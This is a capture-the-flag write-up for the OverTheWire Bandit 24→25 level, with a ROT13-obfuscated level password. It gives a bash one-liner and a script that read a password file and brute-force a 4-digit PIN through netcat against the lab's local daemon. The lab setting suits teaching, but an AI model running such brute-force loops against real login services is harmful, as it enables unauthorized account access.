# Write-up: Bandit 24 → 25
**Date:** 2025-08-16

## Obfuscated password (ROT13) 
`vPv86ggG4XFAr1nezXvjoDAzO3LWC3d4`

## OBJECTIVE
> "A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
> You do not need to create new connections each time."

## PURPOSE
We must brute-force a **4-digit PIN (0000–9999)**, but do it **over a single TCP connection** to `localhost:30002`. Each attempt is one line:
```
<bandit24_password> <4-digit_pin>
```
The server replies “Wrong!” for bad guesses and prints the **bandit25** password for the correct one.

**Why these choices**
- **Single connection:** Faster and kinder to the service than opening 10,000 sockets.
- **`seq -w` (zero-pad):** Ensures pins are `0000…9999` (not `0…9999`).
- **Keep a transcript (optional):** `tee` lets you save and then `grep` the one non-“Wrong!” line.

First, load the current level’s password:
```bash
pass=$(cat /etc/bandit_pass/bandit24)
```

## SOLUTIONS

### Solution A — One-liner (single connection)
```bash
pass=$(cat /etc/bandit_pass/bandit24)
{ for pin in $(seq -w 0000 9999); do echo "$pass $pin"; done; } \
| nc localhost 30002 | grep -iv '^wrong'
```
> If your `nc` is the GNU flavor and doesn’t close after stdin ends, add `-q 1`:
> ```bash
> { for pin in $(seq -w 0000 9999); do echo "$pass $pin"; done; } \
> | nc -q 1 localhost 30002 | grep -iv '^wrong'
> ```

**Why this is good:** minimal, readable, and uses exactly one TCP session.

---

### Solution B — Tiny script (easy to reuse, saves transcript)
Create `/tmp/brute_30002.sh`:
```bash
#!/usr/bin/env bash
# Bandit 24 → 25, brute-force over a single connection

PASS="$(</etc/bandit_pass/bandit24)"
HOST=localhost
PORT=30002
OUT=/tmp/b25.out

{
  for pin in $(seq -w 0000 9999); do
    echo "$PASS $pin"
  done
} | nc "$HOST" "$PORT" | tee "$OUT"

grep -iv '^wrong' "$OUT"
```
Run it:
```bash
chmod +x /tmp/brute_30002.sh
bash /tmp/brute_30002.sh
```
> If needed for GNU `nc`, change the `nc` line to `nc -q 1 "$HOST" "$PORT"`.

**Why this is good:** captures everything to `/tmp/b25.out` for auditing and keeps the logic compact.

---

Writeup author: **Jeremy Ray Jewell**  
[GitHub](https://github.com/jeremyrayjewell) • [LinkedIn](https://www.linkedin.com/in/jeremyrayjewell)
